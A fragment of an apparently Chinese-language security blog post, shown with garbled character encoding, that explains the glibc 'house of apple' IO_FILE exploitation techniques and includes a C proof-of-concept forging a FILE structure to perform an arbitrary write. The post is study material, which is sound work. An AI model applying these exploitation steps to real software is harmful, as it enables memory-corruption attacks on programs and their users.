title="æ”»å‡»æ•ˆæœï¼š"></a>æ”»å‡»æ•ˆæœï¼š</h5><p>ä»»æ„åœ°å€å†™ä¸€ä¸ªå †åœ°å€ï¼ˆä¹Ÿå¯ä»¥æ˜¯ä»»æ„åœ°å€å†™ä¸€ä¸ªå…¶ä»–åœ°å€ï¼Œè¿™ä¸ªå…¶ä»–åœ°å€å–å†³äºä¼ªé€ çš„ <code>IO_FILE</code>åœ¨å“ªé‡Œï¼Œé€šå¸¸æ˜¯åœ¨å †ä¸Šï¼Œæ‰€ä»¥æ˜¯ä»»æ„åœ°å€å†™ä¸€ä¸ªå †åœ°å€ï¼‰</p><h5 id="é€‚ç”¨ç‰ˆæœ¬ï¼š"><a href="#é€‚ç”¨ç‰ˆæœ¬ï¼š" class="headerlink" title="é€‚ç”¨ç‰ˆæœ¬ï¼š"></a>é€‚ç”¨ç‰ˆæœ¬ï¼š</h5><p>ç›®å‰çš„æ‰€æœ‰ <code>libc</code> ç‰ˆæœ¬ï¼Œä» <code>2.23</code> åˆ°ç›®å‰æœ€æ–°çš„ <code>2.36</code></p><h5 id="å‰ç½®çŸ¥è¯†ï¼š"><a href="#å‰ç½®çŸ¥è¯†ï¼š" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h5><p>åœ¨ <code>IO_FILE</code> ä¸­æœ‰ä¸€ä¸ªæˆå‘˜å˜é‡ <code>_wide_data</code> ï¼Œè¯¥æˆå‘˜å˜é‡ä¸ºä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆï¼ˆå¦‚ä¸‹ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¯¥ <code>_IO_wide_data</code> ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹,å®ƒæ˜¯å®½å­—èŠ‚æµçš„æ•°æ®ç»“æ„ï¼Œç”¨äºå¤„ç†å®½å­—ç¬¦çš„è¾“å…¥è¾“å‡ºã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨è¿™ä¸ªç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ª <code>_wide_vtable</code> ï¼Œé‡Œé¢å­˜æ”¾çš„ä¹Ÿéƒ½æ˜¯å‡½æ•°æŒ‡é’ˆ ï¼ˆå¦‚ä¸‹ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstrn_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦å¼ºè°ƒä¸€ä¸‹ <code>_IO_jump_t</code> å’Œ <code>_IO_wstrn_jumps</code> çš„å…³ç³»</p><p><code>_IO_wstrn_jumps</code> å’Œ <code>_IO_jump_t</code> æ˜¯glibcä¸­ä¸¤ç§ä¸åŒç±»å‹çš„ç»“æ„ä½“,å®ƒä»¬æ˜¯ç›¸å…³çš„ã€‚</p><p><code>_IO_jump_t</code>  æ˜¯ <code>glibc</code> ä¸­ä¸€ä¸ªé€šç”¨çš„ç»“æ„ä½“ï¼Œç”¨äºå®ç°æ–‡ä»¶æµçš„å¤šæ€æ€§ã€‚å®ƒå®šä¹‰äº†ä¸€ç»„å‡½æ•°æŒ‡é’ˆï¼Œè¿™äº›å‡½æ•°æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶æµçš„ä¸åŒæ“ä½œï¼Œå¦‚è¯»å†™ã€å®šä½ã€å…³é—­ç­‰ã€‚è€Œ <code>_IO_wstrn_jumps</code> æ˜¯ <code>_IO_jump_t</code> çš„ä¸€ä¸ªå®ä¾‹ã€‚å®ƒæ˜¯ç”¨äºå®ç°å®½å­—ç¬¦æµçš„ã€‚å®ƒç»§æ‰¿äº† <code>_IO_jump_t</code> çš„æ‰€æœ‰å‡½æ•°æŒ‡é’ˆï¼Œå¹¶å®šä¹‰äº†ä¸€äº›é¢å¤–çš„å‡½æ•°æŒ‡é’ˆï¼Œç”¨äºæ”¯æŒå®½å­—ç¬¦æµçš„ç‰¹æ®Šæ“ä½œã€‚</p><p>å›é¡¾ä¸€ä¸‹ <code>_IO_jump_t</code> ç»“æ„ä½“ ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œ <code>vtable</code> æ˜¯å®ƒçš„ä¸€ä¸ªå®ä¾‹ã€‚æ­¤å¤„éœ€è¦ç†è§£æ¸…æ¥šè¿™äº›ç»“æ„ä½“ä¹‹é—´å½¼æ­¤çš„å…³ç³»ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="æ¼æ´åŸç†ï¼š-1"><a href="#æ¼æ´åŸç†ï¼š-1" class="headerlink" title="æ¼æ´åŸç†ï¼š"></a>æ¼æ´åŸç†ï¼š</h5><p>è€Œ <code>house of apple1</code> ä¸­åˆ©ç”¨çš„æ¼æ´ä½ç½®ä½äº <code>_IO_wstrn_jumps</code> ç»“æ„ä½“ä¸­çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„ <code>_IO_wstrn_overflow</code> ,è¯¥å‡½æ•°æºç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line"> snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line"> / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æ˜¯å®½å­—ç¬¦æµçš„æº¢å‡ºå¤„ç†å‡½æ•°ï¼Œå½“å®½å­—ç¬¦ç¼“å†²åŒºå·²æ»¡ï¼Œéœ€è¦å°†æ•°æ®å†™å…¥æŒ‡å®šä½ç½®ï¼ˆæ–‡ä»¶æˆ–è€…ç»ˆç«¯ï¼‰æ—¶ï¼Œè¯¥å‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚</p><p>å…³äºä¸Šé¢çš„ä»£ç é¦–å…ˆè¦åšä¸€ä¸ªç®€å•çš„åˆ†æ</p><ol><li><code>snf</code> çš„åœ°å€å’Œ <code>fp</code> çš„åœ°å€ç›¸åŒ ï¼ˆä¹Ÿå°±æ˜¯å½“å‰å¤„ç†çš„è¿™ä¸ª <code>IO_FILE</code> çš„é¦–åœ°å€ï¼‰</li><li><code>snf-&gt;overflow_buf</code> ç›¸å¯¹äº <code>_IO_FILE</code> ç»“æ„ä½“çš„åç§»ä¸º<code>0xf0</code>ï¼Œç´§è·Ÿç€åœ¨ <code>vtable</code> åé¢</li><li>æ­£å¸¸æƒ…å†µä¸‹ <code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code> è¿™ä¸ªæ¡ä»¶æ˜¯æˆç«‹çš„ã€‚ä¹Ÿå°±æ˜¯ <code>if</code> ä¸‹çš„ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œå®Œæˆä¸‹é¢çš„èµ‹å€¼æ“ä½œ</li></ol><p>æ¼æ´å°±æ˜¯åœ¨èµ‹å€¼ä¸Šé¢ï¼Œå› ä¸ºæ²¡æœ‰å…³äº <code>fp-&gt;_wide_data</code> çš„åˆæ³•æ€§æ£€æŸ¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ <code>fp-&gt;_wide_data</code>ï¼Œï¼ˆä»¥ <code>fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</code> è¿™è¡Œä»£ç ä¸ºä¾‹ï¼‰é‚£å°±å¯ä»¥è®© <code>snf-&gt;overflow_buf</code> è¿™ä¸ªåœ°å€å†™å…¥åˆ° <code>fp-&gt;_wide_data-&gt;_IO_write_base</code>  ä¸Šï¼Œè€Œé€šè¿‡ç»“æ„ä½“æŒ‡é’ˆæ“ä½œç¬¦ <code>-&gt;</code> æ¥è®¿é—®ç»“æ„ä½“ä¸­çš„æˆå‘˜å˜é‡æœ¬è´¨ä¸Šä¹Ÿåªæ˜¯è®¿é—®çš„ä¸€ä¸ªæŒ‡é’ˆåŠ åç§»è€Œå·²ã€‚å› æ­¤å®é™…ä¸Šå®Œæˆçš„å†™å…¥æ“ä½œæ˜¯å°† <code>snf-&gt;overflow_buf</code> åœ°å€å†™å…¥åˆ°äº† <code>fp-&gt;_wide_data</code> åœ°å€åŠ  <code>0x20</code> å¤„ï¼Œ<strong>å®Œæˆäº†ä¸€æ¬¡ä»»æ„åœ°å€å†™ä¸€ä¸ªä¸å¯æ§åœ°å€ï¼ˆè¿™ä¸ªä¸å¯æ§åœ°å€æ˜¯ <code>overflow_buf</code> çš„åœ°å€ï¼Œä¸è¿‡é€šå¸¸æˆ‘ä»¬ä¼ªé€ çš„ <code>IO_FILE</code> åœ¨å †ä¸Šï¼Œæ‰€ä»¥è¿™ä¸ªåœ°å€é€šå¸¸æ˜¯ä¸ªå †åœ°å€ï¼‰</strong>ï¼Œä¹‹åè¿˜æœ‰å‡ æ¬¡èµ‹å€¼æ“ä½œï¼ŒåŸç†ä¾ç„¶å¦‚ä¸Šã€‚</p><p>è‡ªå·±å†™äº†ä¸€ä¸ª <code>demo</code> å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">// gcc demo.c -o demo -g -w</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data address -------&gt; %p\n&quot;</span>,&amp;data);<span class="comment">//æœ€ç»ˆè¢«å†™å…¥æ•°æ®çš„å…¨å±€å˜é‡åœ°å€ </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value   -------&gt; %s\n&quot;</span>,data);<span class="comment">//æ­¤æ—¶å…¨å±€çš„å†…å®¹ä¸ºç©º </span></span><br><span class="line">    </span><br><span class="line"><span class="type">void</span> *libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;<span class="comment">//è·å–libcåŸºåœ°å€ </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc base address ------&gt; %p\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//è¯¥å †å—å°±æ˜¯ç”¨æ¥ä¼ªé€ IO_FILEçš„ </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Forged IO_ File address--------&gt; %p\n&quot;</span>,p);</span><br><span class="line">    </span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> _IO_wstrn_jumps =libc_base+<span class="number">0x215dc0</span>;<span class="comment">//è·å–_IO_wstrn_jumpsçš„åœ°å€ </span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *vtable=p+<span class="number">0xd8</span>;<span class="comment">//è·å–ä¼ªé€ çš„IO_FILEçš„åœ°å€ </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> io_stdin=libc_base+<span class="number">0x219aa0</span>;<span class="comment">//è·å–_IO_2_1_stdin_ç»“æ„ä½“çš„åœ°å€ </span></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(io_stdin+<span class="number">0x68</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(p);</span><br><span class="line"><span class="comment">//è¯¥æ”»å‡»çš„ç¬¬ä¸€æ­¥ï¼Œéœ€è¦å…ˆå°†ä¼ªé€ çš„IO_FILEæ·»åŠ åˆ°_IO_list_allä¸­</span></span><br><span class="line"><span class="comment">//æˆ‘è¿™é‡Œé€‰æ‹©äº†ç¯¡æ”¹_IO_2_1_stdin_ä¸­çš„_chainå­—æ®µï¼Œå°†å…¶æ”¹ä¸ºä¼ªé€ çš„IO_FILE </span></span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    *(vtable)=_IO_wstrn_jumps;<span class="comment">//è¯¥æ”»å‡»çš„ç¬¬äºŒæ­¥ï¼Œå°†IO_FILEä¸­çš„vtableæ”¹æˆ _IO_wstrn_jumpsçš„åœ°å€ </span></span><br><span class="line">    </span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0xa0</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(data<span class="number">-0x18</span>);</span><br><span class="line"><span class="comment">//æ”»å‡»ç¬¬ä¸‰æ­¥ï¼Œå°†ä¼ªé€ çš„_IO_FILEä¸­çš„_wide_dataå­—æ®µæ”¹ä¸ºç›®æ ‡åœ°å€</span></span><br><span class="line"><span class="comment">//è§¦å‘æ”»å‡»æ—¶å°±ä¼šå‘ç›®æ ‡åœ°å€åŠ 0x18 0x20ç­‰ç­‰ä½ç½®å†™å…¥snf-&gt;overflow_bufçš„åœ°å€</span></span><br><span class="line"><span class="comment">//è¿™é‡Œæˆ‘æå‰å°†ç›®æ ‡åœ°å€å‡äº†0x18ï¼Œåœ¨è§¦å‘æ”»å‡»æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥å‘ç›®æ ‡åœ°å€å†™å…¥snf-&gt;overflow_bufçš„åœ°å€äº† </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ä¸‹é¢ä¸¤è¡Œä»£ç æ˜¯ä¸ºäº†ç»•è¿‡æ£€æŸ¥ï¼Œè§¦å‘overflowå‡½æ•°ï¼Œåˆ†åˆ«å°†write_baseè®¾ç½®ä¸º0 write_ptrè®¾ç½®ä¸º1</span></span><br><span class="line"><span class="comment">//éœ€è¦æ³¨æ„çš„æ˜¯æœ¬æ¥è¿˜éœ€è¦ä¼ªé€ _modeå­—æ®µä¸º0ï¼Œä½†æ˜¯é€šå¸¸åœ¨å †å—ä¸Šè¿™ä¸ªå­—æ®µé»˜è®¤æ˜¯0</span></span><br><span class="line"><span class="comment">//æ‰€ä»¥ä¸‹é¢å°±æ²¡æœ‰ä¼ªé€ ï¼Œä½†å¹¶ä¸æ„å‘³è¿™_modeå­—æ®µä¸éœ€è¦ä¼ªé€  </span></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0x28</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(<span class="number">1</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0x20</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fcloseall();<span class="comment">//è§¦å‘æ”»å‡» </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value -------&gt; %s\n&quot;</span>,data);<span class="comment">//æœ€åæ‰“å°dataçš„å†…å®¹ï¼Œå‘ç°åŸæœ¬å†…å®¹æ˜¯ç©ºçš„dataå˜æˆäº†snf-&gt;overflow_bufçš„åœ°å€ </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305121929997.png" alt="image-20230512192939734"></p><p>å› ä¸ºä¸Šå›¾ä¸­æœ€åçš„ <code>data value</code> æ˜¯ä¸ªåœ°å€ï¼Œå­˜åœ¨ä¸å¯è§å­—ç¬¦ï¼Œå®é™…å€¼å¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305121934919.png" alt="image-20230512193409832"></p><p>ä¸Šè¿°ä¾¿æ˜¯ <code>house of apple1</code> çš„å­¦ä¹ æ€»ç»“ï¼Œè¯¥æ”»å‡»å¹¶ä¸èƒ½ç›´æ¥è·å– <code>shell </code> ï¼Œé€šå¸¸æƒ…å†µä¸‹æ˜¯åªèƒ½å‘å‡ ä¸ªåœ°å€é‡Œå†™å…¥ä¸€ä¸ªå †åœ°å€ã€‚ä½†æ˜¯é€šè¿‡å¯¹äº <code>house of apple1</code> çš„å­¦ä¹ è®©æˆ‘ä½“ä¼šåˆ°äº†ä¸€ç§æ–°å‹çš„æ”»å‡»æ€è·¯ï¼Œä¸ªäººæ„Ÿè§‰æœ€å¥½çš„çŠ¶æ€å°±æ˜¯å…ˆçœ‹æ–‡ç« å­¦ä¹ ï¼Œæœ€åæ ¹æ®è‡ªå·±çš„ç†è§£å†™ä¸€ä¸ª <code>demo</code> ï¼Œåªè¦ <code>demo</code> æ²¡æœ‰æˆåŠŸè§¦å‘æ”»å‡»å°±è¯´æ˜è‡ªå·±è¿˜æœ‰åœ°æ–¹æ²¡ç†è§£ï¼Œå½“ <code>demo</code> æˆåŠŸè§¦å‘æ”»å‡»æ—¶ï¼Œå°±è¯´æ˜è‡ªå·±çš„ç†è§£æ˜¯æ­£ç¡®çš„ã€‚</p><h4 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h4><h5 id="åˆ©ç”¨æ¡ä»¶ï¼š-1"><a href="#åˆ©ç”¨æ¡ä»¶ï¼š-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶ï¼š"></a>åˆ©ç”¨æ¡ä»¶ï¼š</h5><ol><li>å¯ä»¥æ³„éœ² <code>libc</code> åœ°å€å’Œå †åœ°å€ </li><li>å¯ä»¥ä½¿ç”¨ä»»æ„åœ°å€å†™ä¸€ä¸ªå †åœ°å€ï¼ˆé€šå¸¸æ˜¯ä½¿ç”¨ <code>large bin attack</code> ï¼‰</li><li>ä» <code>main</code> å‡½æ•°è¿”å›æˆ–è€…è°ƒç”¨ <code>exit</code> å‡½æ•°</li></ol><h5 id="æ”»å‡»æ•ˆæœï¼š-1"><a href="#æ”»å‡»æ•ˆæœï¼š-1" class="headerlink" title="æ”»å‡»æ•ˆæœï¼š"></a>æ”»å‡»æ•ˆæœï¼š</h5><p>æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµ</p><h5 id="é€‚ç”¨ç‰ˆæœ¬ï¼š-1"><a href="#é€‚ç”¨ç‰ˆæœ¬ï¼š-1" class="headerlink" title="é€‚ç”¨ç‰ˆæœ¬ï¼š"></a>é€‚ç”¨ç‰ˆæœ¬ï¼š</h5><p>ç›®å‰çš„æ‰€æœ‰ <code>libc</code> ç‰ˆæœ¬ï¼Œä» <code>2.23</code> åˆ°ç›®å‰æœ€æ–°çš„ <code>2.36</code></p><h5 id="å‰ç½®çŸ¥è¯†ï¼š-1"><a href="#å‰ç½®çŸ¥è¯†ï¼š-1" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h5><p>åœ¨ <code>2.23</code> çš„ <code>libc</code> ç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥åŠ«æŒ <code>vtable</code> ï¼Œä»è€Œæ›¿æ¢å…¶ä¸­çš„å‡½æ•°æŒ‡é’ˆæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµï¼Œä½†æ˜¯åœ¨ä¹‹åçš„ <code>libc</code> ç‰ˆæœ¬ä¸­ï¼Œéƒ½å¯¹ <code>vtable</code> è¿›è¡Œäº†åˆæ³•æ€§æ£€æŸ¥,åˆ¤æ–­ <code>vtable</code> åœ°å€æ˜¯å¦åœ¨ä¸€ä¸ªåˆæ³•çš„åŒºé—´é‡Œã€‚ä½†è¿™ä¸æ„å‘³ç€æ— æ³•ä¼ªé€  <code>vtable</code> äº†ï¼Œç›®å‰å¦‚æœå°† <code>vtable</code> åŸæœ¬å­˜æ”¾çš„ <code>_IO_jump_t</code> æ”¹æˆ <code>_IO_wfile_jumps</code> ä¾ç„¶æ˜¯å¯ä»¥é€šè¿‡æ£€æŸ¥çš„ã€‚ï¼ˆ <strong>roderick</strong> å¸ˆå‚…è¯´åªè¦æ˜¯ <code>jumps</code> éƒ½æ»¡è¶³æ£€æµ‹ ï¼‰ï¼ˆåœ¨ <code>house of apple1</code> ä¸­æˆ‘ä»¬æ˜¯å°† <code>_IO_jump_t</code> æ”¹æˆäº† <code>_IO_wstrn_jumps</code>ï¼‰</p><p><code>_IO_wfile_jumps</code> ç»“æ„ä½“å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span 